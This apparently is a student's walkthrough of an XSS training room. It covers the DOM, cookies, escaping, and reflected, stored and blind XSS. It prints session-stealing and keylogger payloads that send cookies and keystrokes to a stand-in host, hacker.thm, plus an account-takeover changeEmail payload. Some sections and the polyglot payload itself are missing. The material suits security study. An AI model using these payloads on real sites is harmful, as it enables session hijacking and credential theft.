## Task 1: Introduction 

### What's XSS?
**Cross-Site Scripting (XSS)** lets attackers inject malicious code into web pages. When other users visit those pages, the code runs in their browsers — allowing attackers to steal sessions, deliver malware, or escalate attacks.

### Scenario
A company has hired you to perform a penetration test on their internal web application. The application includes three main areas:

- **A public comments section** where users can post messages
- **A user dashboard** where users manage their profiles
- **A news search option** where users can look up articles

The company needs an immediate security assessment to identify any vulnerabilities and prevent data theft or further damage.


### Learning Objectives
By the end of this room, you'll understand:
- Common XSS terminology — the key terms and concepts
- How to identify XSS — and classify the three main types:
  - Reflected XSS
  - Stored XSS
  - DOM-based XSS
- How to exploit XSS — craft working attacks
- How to mitigate XSS — protect applications with practical defenses

## Task 2: Important Terminologies


### 1. DOM - Document Object Model

The **DOM** is the browser's in-memory representation of a webpage.

<img width="1200" height="600" alt="image" src="https://github.com/user-attachments/assets/f9ef14e2-0550-48c3-9540-e2efe9f2c85e" />

JavaScript can interact with this tree and change the webpage.

Example:
````
document.title = "Hacked";
````
The browser immediately changes the page title.



For XSS, the important idea is: ``Attacker input -> JavaScript -> DOM -> Browser changes/interacts with page``


2. URL Parameters

A **URL parameter** is information placed after ? in a URL.

Example:
````
https://site.com/search?q=hello
````
| Part                      | Meaning                 |
| ------------------------- | ----------------------- |
| `https://site.com/search` | Website/page            |
| `?`                       | Starts query parameters |
| `q`                       | Parameter name          |
| `hello`                   | Parameter value         |



The important thing is that the user can normally change the value:
````
https://site.com/search?q=hello
````
To:
````
https://site.com/search?q=test
````
or potentially malicious input.

Therefore: `URL parameter = User-controlled input`


We should treat it as untrusted input.



### 3. JavaScript

**JavaScript** is a programming language that runs inside the browser.

For example:
````
alert("Hello");
````
JavaScript can interact with the webpage's DOM.

In XSS, an attacker tries to get JavaScript to execute in another user's browser.

Conceptually: ``Attacker-controlled input ->  Web application -> Browser -> JavaScript executes -> XSS``.



### 4. Cookies

Cookies are small pieces of data stored by the browser.

For example:
````
session_id=abc123
````
A website may use a cookie to remember that you are logged in.

The important XSS concept is: ``XSS -> JavaScript executes -> JavaScript may access document.cookie -> Cookie could potentially be exposed``

However, there is an important protection:


#### HttpOnly

If a cookie has the ``HttpOnly`` flag:
````
HttpOnly = true
````
JavaScript cannot normally read that cookie through:
````
document.cookie
````
So:
| Cookie setting    | JavaScript can read it? |
| ----------------- | ----------------------- |
| Normal cookie     | Yes                     |
| `HttpOnly` cookie | No                      |


> **Note**: ``HttpOnly`` is therefore an important defense against cookie theft through XSS.




### 5. Escaping / Output Encoding

**Escaping** means converting special characters so the browser treats them as text instead of ``HTML/code``.

For example, suppose the user enters:
````
<script>alert(1)</script>
````
If the application places this directly into HTML, the browser may interpret ``<script>`` as HTML.

With HTML escaping:
````
<  →  &lt;
>  →  &gt;
````
So the input becomes:
````
&lt;script&gt;alert(1)&lt;/script&gt;
````
The browser displays it as text rather than interpreting it as a ``<script>`` element.


---

### Summary:

| Term              | Simple meaning                             | Why it matters for XSS                       |
| ----------------- | ------------------------------------------ | -------------------------------------------- |
| **DOM**           | Browser's webpage structure                | XSS can interact with the DOM                |
| **URL parameter** | User-controlled value in a URL             | Can become the injection point               |
| **JavaScript**    | Code running in the browser                | XSS often results in JavaScript execution    |
| **Cookie**        | Browser-stored data                        | Sensitive cookies may be targeted            |
| **HttpOnly**      | Cookie protection flag                     | Prevents JavaScript from reading that cookie |
| **Escaping**      | Converts special characters into safe text | Helps prevent HTML injection/XSS             |

## Task 3: XSS Payloads

### What Is an XSS Payload?

An **XSS payload** is code that an attacker puts into a vulnerable web application so that the browser executes it as ``JavaScript``.

<img width="1200" height="595" alt="image" src="https://github.com/user-attachments/assets/ab44b2d9-5954-464e-8bd8-9975b60691ee" />

``Attacker-> Malicious input -> Vulnerable website -> Input appears in webpage -> Victim opens page -> Browser executes JavaScript -> XSS``.

A simple proof-of-concept payload is:
````js
<script>alert('XSS')</script>
````
If the website is vulnerable, the browser executes the JavaScript and displays an alert.


> **Important idea**:
> The payload itself isn't automatically XSS.
> It becomes an XSS vulnerability when the application places the attacker-controlled input into the page without properly handling it.



#### 1. Intention

The **intention** is the attacker's objective.

For example:
````
Payload
   ↓
What should it accomplish?
   ├── Prove XSS exists
   ├── Access sensitive information
   ├── Perform an action
   └── Capture user input
````
For security testing, the safest first objective is normally simply: ``"Can JavaScript execute here?"``

That's why testers commonly begin with a harmless proof-of-concept such as:
````js
<script>alert('XSS')</script>
````

#### 2. Modification

Not every payload works everywhere.

The reason is that the application might place your input inside different parts of HTML.

For example:
````
<p>USER_INPUT</p>
````
is different from:
````
<input value="USER_INPUT">
````
and different again from:
````js
<script>
let name = "USER_INPUT";
</script>
````
So a tester needs to understand ``where the input is reflected``.

Think of it like: ``User input -> Where does the application put it? -> HTML text?, HTML attribute?, JavaScript?, DOM? -> Choose appropriate test``

This is called understanding the **injection context**.



### 2. Testing for XSS

The lesson recommends starting with a simple payload.
````
<script>alert('XSS')</script>
````
If the browser displays an alert: ``Input -> Application -> Browser -> JavaScript executes -> XSS confirmed``

This is useful because it gives us a simple answer:

> Can JavaScript execute in this location?

Once XSS is confirmed in an authorized lab, a security tester can investigate the impact and determine the appropriate remediation.



### 3. Where Can XSS Payloads Be Injected?

**XSS** can occur anywhere an application accepts and later displays user-controlled input.

Common locations include:
| Location                     | Example          |
| ---------------------------- | ---------------- |
| Search field                 | Search term      |
| Comment section              | User comment     |
| Profile name                 | Username         |
| Feedback form                | Feedback message |
| URL parameter                | `?q=hello`       |
| Other user-generated content | Messages/posts   |

For example:
````
https://site.thm/search?q=hello
````
The application might display: ``WE searched for: hello``

The important question is: ``Does the application safely encode "hello"?``

If it doesn't properly handle attacker-controlled input, XSS may be possible.



### 4. Understanding the URL Example

The normal request:
````
https://site.thm/search?q=hello
````
contains:
````
q = hello
````
The application might produce: ``We searched for: hello``

Conceptually: ``URL -> q=hello -> Server/application -> HTML response -> Browser -> "We searched for: hello"``

Now imagine replacing the normal value with a test payload:
````
q=<test payload>
````
If the application inserts it into the HTML without appropriate output encoding, the browser may interpret it as markup or script rather than ordinary text.




### 5. Examples of XSS Intentions

The third screenshot shows several possible attacker intentions.

#### A. Proof of Concept

The simplest goal is to prove that XSS exists.
````js
<script>alert('XSS')</script>
````
Result: ``Input -> Website -> Browser -> JavaScript executes -> "XSS" alert appears``

This confirms that the application may be vulnerable to XSS.


#### B. Session Stealing

Web applications often use cookies to store session identifiers.

Conceptually: ``User logs in -> Server creates session -> Browser stores session cookie -> Browser sends cookie with requests -> Website knows which user is logged in``

If an attacker can access a sensitive session cookie through XSS, they may potentially impersonate that user.

The example from the lesson is:
````js
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
````
The important parts are:
| Part              | Meaning                                           |
| ----------------- | ------------------------------------------------- |
| `document.cookie` | Attempts to read cookies accessible to JavaScript |
| `btoa()`          | Base64-encodes the value                          |
| `fetch()`         | Makes a web request                               |
| `/steal?cookie=`  | Sends the encoded value as a parameter            |


However, remember that ``HttpOnly`` cookies cannot normally be read using ``document.cookie``.


#### C. Keylogger

A **keylogger** records keyboard input.

The lesson gives:
````
<script>
document.onkeypress = function(e) {
    fetch('https://hacker.thm/log?key=' + btoa(e.key));
}
</script>
````

The basic concept is: ``Victim types a key -> Keyboard event occurs -> JavaScript receives the event -> Key is processed -> Information could be transmitted``

For example: ``Victim types:  A -> JavaScript receives: A``



#### D. Business Logic Attacks

This is different from simply displaying an alert.

Imagine the application has a JavaScript function:
````
user.changeEmail()
````
which changes the user's email address.

If attacker-controlled JavaScript executes in the victim's browser, it could potentially interact with functionality available to that user.

The lesson's example is:
````
<script>user.changeEmail('attacker@hacker.thm');</script>
````
The concept is: ``XSS -> JavaScript executes as victim -> Application functionality is accessed -> Unauthorized action -> Potential account impact``

This demonstrates an important point:

> XSS is not just about showing an ``alert()`` box.

The real impact depends on what the victim's browser can do on that website.

| XSS Intention             | Main Goal                          | Example Impact                 |
| ------------------------- | ---------------------------------- | ------------------------------ |
| **Proof of Concept**      | Prove JavaScript executes          | Alert appears                  |
| **Session Stealing**      | Access exposed session information | Possible impersonation         |
| **Keylogger**             | Observe keyboard input             | Sensitive input may be exposed |
| **Business Logic Attack** | Abuse application functionality    | Unauthorized account action    |

## Task 4: Reflected XSS (Non-Persistent)

**Reflected XSS** happens when a website takes user input and immediately reflects it back into the webpage **without properly escaping/sanitising it**.


**Reflected XSS = attacker-controlled input → website reflects it → browser executes it.**

<img width="1200" height="533" alt="image" src="https://github.com/user-attachments/assets/22fcc935-ef01-46a1-b76f-30a8ebdb596d" />


``Attacker creates malicious URL -> Victim clicks the link -> Website receives the input -> Website reflects the input into the page -> Browser interprets it as code -> JavaScript executes``

| Reflected XSS                       | Stored XSS                                    |
| ----------------------------------- | --------------------------------------------- |
| Payload is reflected immediately    | Payload is stored                             |
| Usually requires victim interaction | May execute when victim views stored content  |
| Commonly appears in URL/request     | Commonly appears in comments, profiles, posts |

## Task 5: Stored XSS (Persistent)

### What is Stored XSS?

**Stored XSS** happens when an application saves attacker-controlled input on the server, usually in a database, and later displays that input to users without properly escaping it.


<img width="1200" height="475" alt="image" src="https://github.com/user-attachments/assets/6603bebb-af91-4113-96c5-1a22ef7d21f9" />


The important difference is:

#### Reflected XSS
````
User input → Response → Browser
             ↑
        not stored
````

- while Stored XSS is: ``Attacker input -> Website -> Database -> Other user -> Browser -> JavaScript executes``.


> **Note**: A type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can then steal sensitive information, like user's cookies, session tokens, or other sensitive data.

## Task 7: Blind XSS

Blind XSS is similar to Stored XSS, but the important difference is: **We cannot see the payload execute ourself**:


<img width="1200" height="596" alt="image" src="https://github.com/user-attachments/assets/44c935ae-08b3-4f18-ac5b-302afa7a389a" />


``Attacker -> Submits malicious message -> Website stores it -> Staff/Admin opens the message -> JavaScript executes in Admin's browser -> Attacker receives a callback``


#### Why is it called "Blind"?

With normal Stored XSS: ``Attacker → Store payload → Open page → See XSS``

With Blind XSS: ``Attacker → Store payload -> Admin opens later -> XSS executes -> Attacker receives callback``

The attacker is **blind to the execution** unless their callback confirms that the payload ran.

A popular tool for Blind XSS attacks is XSS Hunter Express (opens in new tab). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

https://github.com/mandatoryprogrammer/xsshunter-express

#### Blind XSS vs Stored XSS
| Type              | What happens                                                                                     |
| ----------------- | ------------------------------------------------------------------------------------------------ |
| **Stored XSS**    | Payload is stored and you can usually see it execute                                             |
| **Blind XSS**     | Payload is stored, but execution happens in another user's browser and you don't directly see it |
| **Reflected XSS** | Payload is reflected immediately in the response                                                 |
| **DOM XSS**       | Client-side JavaScript reads and writes attacker-controlled data                                 |

````

````
| Part                   | Purpose                                      |
| ---------------------- | -------------------------------------------- |
| `jaVasCript:`          | Attempts to work in JavaScript/URL contexts  |
| `/* ... */`            | JavaScript comment tricks                    |
| `` ` `` / `'` / `"`    | Attempts to escape different string contexts |
| `onerror=alert('THM')` | Event-handler XSS technique                  |
| `%0D%0A`               | Encoded line breaks                          |
| `</stYle/`             | Attempts to escape a `<style>` context       |
| `</titLe/`             | Attempts to escape a `<title>` context       |
| `</teXtarEa/`          | Attempts to escape a `<textarea>` context    |
| `</scRipt/`            | Attempts to escape a `<script>` context      |

| `sVg`                  | Uses an SVG element                          |

| Topic                | What you learned                                                                         |
| -------------------- | ---------------------------------------------------------------------------------------- |
| **XSS**              | Injecting JavaScript into a web application so the browser executes it                   |
| **Reflected XSS**    | Input is immediately reflected back in the response                                      |
| **Stored XSS**       | Malicious input is stored and later executed when users view it                          |
| **DOM-Based XSS**    | Client-side JavaScript takes untrusted data from the DOM and puts it into an unsafe sink |
| **Blind XSS**        | Payload executes later in another user's browser, often an admin/staff user              |
| **Payload**          | The JavaScript/HTML input used to demonstrate or exploit XSS                             |
| **Context**          | Where your input appears: HTML, attribute, textarea, JavaScript, etc.                    |
| **Payload escaping** | Closing the surrounding HTML/JS context so your code can execute                         |
| **Filters**          | Input restrictions that may block obvious XSS payloads                                   |
| **Polyglot**         | One payload designed to work across multiple contexts                                    |
